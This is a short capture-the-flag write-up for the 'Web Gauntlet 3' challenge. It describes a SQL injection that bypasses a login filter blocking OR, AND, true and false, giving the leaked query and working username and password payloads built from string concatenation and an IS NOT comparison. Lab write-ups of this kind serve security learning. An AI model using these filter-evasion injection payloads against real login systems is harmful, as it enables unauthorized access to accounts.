
# Web Gauntlet 3

SQL injection and conditions.


# Problem

The challenge is to bypass the filters and to create a condition on the server-side
which evaluates to `true`.


# Solution

## Step 1: Find out the SQL query

Username: `adm'||'in`
Password: `whatever`

This printed out the SQL query that's being used on the server side for the login:

```sql
SELECT username, password FROM users WHERE username='adm'||'in' AND password='whatever'
```

## Step 2: Modifying the AND condition

The filter blocks out pretty much everything in regards to `OR`, `AND`, `true` and `false`,
so the real challenge behind this CTF was to find a way to make the condition evaluate to
`true`, so that the query succeeds.

```sql
-- Simplified query
SELECT username, password FROM users WHERE () AND (/*...needs to be true...*/)
```

In order to make the condition evaluate to `true`, we tried out a couple of variations for
the `password` input field, where `a' IS NOT 'b` eventually succeeded. Probably `a' IS 'a`
or other variations would succeed, too.

As the combined input had to be maximum `25` characters, the amount of solutions was quite
limited.

Username: `ad'||'min`
Password: `a' IS NOT 'b`

